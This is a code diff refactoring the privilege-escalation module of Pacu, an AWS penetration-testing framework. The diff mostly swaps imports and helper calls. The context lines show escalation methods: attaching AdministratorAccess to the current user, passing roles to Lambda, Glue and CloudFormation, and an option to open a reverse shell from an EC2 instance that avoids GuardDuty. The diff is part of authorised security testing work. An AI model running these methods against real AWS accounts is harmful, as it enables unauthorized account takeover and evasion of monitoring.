@@ -1,16 +1,20 @@
 #!/usr/bin/env python3
 import argparse
-from botocore.exceptions import ClientError
-import string
-from copy import deepcopy
 import json
 import os
-import re
 import random
-import time
+import re
+import string
 import subprocess
-from utils import remove_empty_from_dict
+import time
+from copy import deepcopy
 
+from botocore.exceptions import ClientError
+
+from pacu.aws import get_boto3_client, get_regions
+from pacu.core.models import key_info
+from pacu.io import print
+from pacu.utils import remove_empty_from_dict
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -61,13 +65,12 @@ parser.add_argument('--scan-only', required=False, default=False, action='store_
 
 
 def main(args, pacu_main):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
-    print = pacu_main.print
+
     input = pacu_main.input
-    key_info = pacu_main.key_info
     fetch_data = pacu_main.fetch_data
     ######
 
@@ -643,17 +646,17 @@ def summary(data, pacu_main):
 # Each of these will return True if successful and False if failed
 
 def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method CreateNewPolicyVersion...\n')
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a valid policy to target): ')
 
     if not policy_arn:
         print('    No policy ARN entered, now finding a valid policy...\n')
 
-        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        active_aws_key = session.key_alias
 
         if active_aws_key.policies:
             all_user_policies = active_aws_key.policies
@@ -759,10 +762,10 @@ def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
 
 
 def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method SetExistingDefaultPolicyVersion...\n')
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a list of valid policies to check): ')
 
@@ -774,7 +777,7 @@ def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
     if not policy_arn:
         print('    No policy ARN entered, now finding a valid policy...\n')
 
-        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        active_aws_key = session.key_alias
 
         if active_aws_key.policies:
             all_user_policies = active_aws_key.policies
@@ -891,11 +894,11 @@ def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
 
 
 def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method CreateEC2WithExistingIP...\n')
 
-    regions = pacu_main.get_regions('ec2')
+    regions = get_regions('ec2')
     region = None
 
     if len(regions) > 1:
@@ -908,7 +911,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
         region = regions[0]
     else:
         while not region:
-            all_ec2_regions = pacu_main.get_regions('ec2', check_session=False)
+            all_ec2_regions = get_regions('ec2', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -938,7 +941,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
 
     print('    Targeting region {}...'.format(region))
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     response = client.list_instance_profiles()
     instance_profiles = response['InstanceProfiles']
@@ -966,7 +969,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
         return False
 
     while True:
-        client = pacu_main.get_boto3_client('ec2', region)
+        client = get_boto3_client('ec2', region)
         print('Ready to start the new EC2 instance. What would you like to do?')
         print('  1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet).')
         print('  2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet).')
@@ -1099,7 +1102,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
 
 
 def CreateAccessKey(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method CreateAccessKey...\n')
 
@@ -1133,7 +1136,7 @@ def CreateAccessKey(pacu_main, print, input, fetch_data):
 
 
 def CreateLoginProfile(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method CreatingLoginProfile...\n')
 
@@ -1175,7 +1178,7 @@ def CreateLoginProfile(pacu_main, print, input, fetch_data):
 
 
 def UpdateLoginProfile(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method UpdateLoginProfile...\n')
 
@@ -1216,16 +1219,16 @@ def UpdateLoginProfile(pacu_main, print, input, fetch_data):
 
 
 def AttachUserPolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method AttachUserPolicy...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     print('Trying to attach an administrator policy to the current user...\n')
 
     try:
-        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        active_aws_key = session.key_alias
         client.attach_user_policy(
             UserName=active_aws_key.user_name,
             PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
@@ -1238,12 +1241,12 @@ def AttachUserPolicy(pacu_main, print, input, fetch_data):
 
 
 def AttachGroupPolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method AttachGroupPolicy...\n')
 
-    active_aws_key = session.get_active_aws_key(pacu_main.database)
-    client = pacu_main.get_boto3_client('iam')
+    active_aws_key = session.key_alias
+    client = get_boto3_client('iam')
 
     group = input('    Is there a specific group you want to target? Enter its name now or just hit enter to automatically find a valid group: ')
 
@@ -1278,11 +1281,11 @@ def AttachGroupPolicy(pacu_main, print, input, fetch_data):
 
 
 def AttachRolePolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method PutRolePolicy...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
 
@@ -1313,12 +1316,12 @@ def AttachRolePolicy(pacu_main, print, input, fetch_data):
 
 
 def PutUserPolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    session = pacu_main.session
+    active_aws_key = session.key_alias
 
     print('  Starting method PutUserPolicy...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     print('Trying to add an administrator policy to the current user...\n')
 
@@ -1337,12 +1340,12 @@ def PutUserPolicy(pacu_main, print, input, fetch_data):
 
 
 def PutGroupPolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    session = pacu_main.session
+    active_aws_key = session.key_alias
 
     print('  Starting method PutGroupPolicy...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     target_group = input('    Is there a specific group to target? Enter the name now or just press enter to enumerate a list of possible groups to choose from: ')
 
@@ -1370,11 +1373,11 @@ def PutGroupPolicy(pacu_main, print, input, fetch_data):
 
 
 def PutRolePolicy(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method PutRolePolicy...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
 
@@ -1407,11 +1410,11 @@ def PutRolePolicy(pacu_main, print, input, fetch_data):
 
 
 def AddUserToGroup(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method AddUserToGroup...\n')
 
-    client = pacu_main.get_boto3_client('iam')
+    client = get_boto3_client('iam')
 
     group_name = input('    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list of possible groups to choose from: ')
     if group_name == '':
@@ -1430,7 +1433,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
             group_name = groups[int(choice) - 1]['GroupName']
 
     try:
-        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        active_aws_key = session.key_alias
         client.add_user_to_group(
             GroupName=group_name,
             UserName=active_aws_key.user_name
@@ -1448,7 +1451,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
 
 
 def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method UpdateRolePolicyToAssumeIt...\n')
 
@@ -1509,7 +1512,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
         print('Failed to create a new Lambda function: {}\n'.format(error))
         return False
 
-    client = pacu_main.get_boto3_client('dynamodb', region)
+    client = get_boto3_client('dynamodb', region)
     dynamo_table_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
 
     # Create DynamoDB table
@@ -1545,7 +1548,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
 
     # Create Lambda event source mapping
     try:
-        client = pacu_main.get_boto3_client('lambda', region)
+        client = get_boto3_client('lambda', region)
         client.create_event_source_mapping(
             FunctionName=function_name,
             EventSourceArn=stream_arn,
@@ -1569,10 +1572,10 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n')
 
     # Enumerate DynamoDB Streams
-    regions = pacu_main.get_regions('streams.dynamodb')
+    regions = get_regions('streams.dynamodb')
     target_region = None
     if len(regions) == 0:
-        all_dynamodbstreams_regions = pacu_main.get_regions('streams.dynamodb', check_session=False)
+        all_dynamodbstreams_regions = get_regions('streams.dynamodb', check_session=False)
         while not target_region:
             target_region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not target_region:
@@ -1585,7 +1588,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
 
     all_streams = {}
     for region in regions:
-        client = pacu_main.get_boto3_client('dynamodbstreams', region)
+        client = get_boto3_client('dynamodbstreams', region)
         streams = client.list_streams()['Streams']
         if len(streams) > 0:
             all_streams[region] = streams
@@ -1635,7 +1638,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
         return False
 
     # Set Lambda concurrency limit (Success or fail won't change what happens next, so ignore it)
-    client = pacu_main.get_boto3_client('lambda', region)
+    client = get_boto3_client('lambda', region)
     try:
         client.put_function_concurrency(
             FunctionName=function_name,
@@ -1668,13 +1671,13 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
 
 
 def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='', region=None):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     if zip_file == '':
         zip_file = './modules/{}/lambda.zip'.format(module_info['name'])
 
     if region is None:
-        regions = pacu_main.get_regions('lambda')
+        regions = get_regions('lambda')
 
         if len(regions) > 1:
             print('  Found multiple valid regions to use. Choose one below.\n')
@@ -1686,7 +1689,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
             region = regions[0]
         else:
             while not region:
-                all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
+                all_lambda_regions = get_regions('lambda', check_session=False)
                 region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
                 if not region:
                     return False
@@ -1695,7 +1698,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
                     print(all_lambda_regions)
                     region = None
 
-    client = pacu_main.get_boto3_client('lambda', region)
+    client = get_boto3_client('lambda', region)
 
     target_role_arn = input('  Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
 
@@ -1734,7 +1737,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
 
 
 def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method PassExistingRoleToNewGlueDevEndpoint...\n')
 
@@ -1744,7 +1747,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
         print('    Skipping to next privilege escalation method...\n')
         return False
 
-    regions = pacu_main.get_regions('glue')
+    regions = get_regions('glue')
     region = None
 
     if len(regions) > 1:
@@ -1757,7 +1760,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
         region = regions[0]
     else:
         while not region:
-            all_glue_regions = pacu_main.get_regions('glue', check_session=False)
+            all_glue_regions = get_regions('glue', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -1766,7 +1769,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
                 print(all_glue_regions)
                 region = None
 
-    client = pacu_main.get_boto3_client('glue', region)
+    client = get_boto3_client('glue', region)
 
     target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
 
@@ -1821,7 +1824,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
 
 
 def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method UpdateExistingGlueDevEndpoint...\n')
 
@@ -1847,7 +1850,7 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
             endpoint_name = input('    Enter a development endpoint name: ')
         else:
             endpoint_name = dev_endpoints[int(choice) - 1]['EndpointName']
-        client = pacu_main.get_boto3_client('glue', dev_endpoints[int(choice) - 1]['Region'])
+        client = get_boto3_client('glue', dev_endpoints[int(choice) - 1]['Region'])
 
     try:
         client.update_dev_endpoint(
@@ -1869,7 +1872,7 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method PassExistingRoleToNewCloudFormation...\n')
 
@@ -1887,7 +1890,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
         choice = input('Choose an option: ')
         target_role_arn = roles[int(choice)]['Arn']
 
-    regions = pacu_main.get_regions('cloudformation')
+    regions = get_regions('cloudformation')
     if len(regions) > 1:
         print('  Found multiple valid regions to use. Choose one below.\n')
         for i in range(0, len(regions)):
@@ -1898,7 +1901,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
         region = regions[0]
     else:
         while not region:
-            all_cloudformation_regions = pacu_main.get_regions('cloudformation', check_session=False)
+            all_cloudformation_regions = get_regions('cloudformation', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -1907,7 +1910,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
                 print(all_cloudformation_regions)
                 region = None
 
-    client = pacu_main.get_boto3_client('cloudformation', region)
+    client = get_boto3_client('cloudformation', region)
 
     # The "a" in the beginning as it must start with a letter
     stack_name = 'a' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
@@ -1983,11 +1986,11 @@ def CodeStarCreateProjectFromTemplate(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method PassExistingRoleToNewCodeStarProject...\n')
 
-    regions = pacu_main.get_regions('codestar')
+    regions = get_regions('codestar')
     region = None
 
     if len(regions) > 1:
@@ -2000,7 +2003,7 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
         region = regions[0]
     else:
         while not region:
-            all_codestar_regions = pacu_main.get_regions('codestar', check_session=False)
+            all_codestar_regions = get_regions('codestar', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -2025,8 +2028,8 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
         choice = input('Choose an option: ')
         target_role_arn = roles[int(choice)]['Arn']
 
-    client = pacu_main.get_boto3_client('codestar', region)
-    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    client = get_boto3_client('codestar', region)
+    active_aws_key = session.key_alias
 
     project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
 
@@ -2150,11 +2153,11 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
 
 
 def CodeStarCreateProjectThenAssociateTeamMember(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
+    session = pacu_main.session
 
     print('  Starting method CodeStarCreateProjectThenAssociateTeamMember...\n')
 
-    regions = pacu_main.get_regions('codestar')
+    regions = get_regions('codestar')
     region = None
 
     if len(regions) > 1:
@@ -2167,7 +2170,7 @@ def CodeStarCreateProjectThenAssociateTeamMember(pacu_main, print, input, fetch_
         region = regions[0]
     else:
         while not region:
-            all_codestar_regions = pacu_main.get_regions('codestar', check_session=False)
+            all_codestar_regions = get_regions('codestar', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -2178,8 +2181,8 @@ def CodeStarCreateProjectThenAssociateTeamMember(pacu_main, print, input, fetch_
 
     print('    Targeting region {}...'.format(region))
 
-    client = pacu_main.get_boto3_client('codestar', region)
-    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    client = get_boto3_client('codestar', region)
+    active_aws_key = session.key_alias
 
     project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
 
